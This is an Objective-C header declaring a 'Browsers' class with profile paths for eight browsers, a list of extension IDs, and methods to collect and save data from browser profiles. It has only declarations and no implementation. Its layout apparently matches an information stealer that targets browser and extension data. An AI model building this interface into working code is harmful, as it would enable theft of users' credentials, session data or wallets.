#import <Foundation/Foundation.h>

@interface Browsers : NSObject

@property (nonatomic, strong) NSString *chromePath;
@property (nonatomic, strong) NSString *firefoxPath;
@property (nonatomic, strong) NSString *bravePath;
@property (nonatomic, strong) NSString *edgePath;
@property (nonatomic, strong) NSString *vivaldiPath;
@property (nonatomic, strong) NSString *yandexPath;
@property (nonatomic, strong) NSString *operaPath;
@property (nonatomic, strong) NSString *operaGXPath;

+ (NSArray<NSString *> *)extensionIDs;
- (void)collectAllData;
- (void)collectDataAndSave:(NSString *)browserName
             pathToProfile:(NSString *)pathToProfile
               pathToSave:(NSString *)pathToSave;

@end
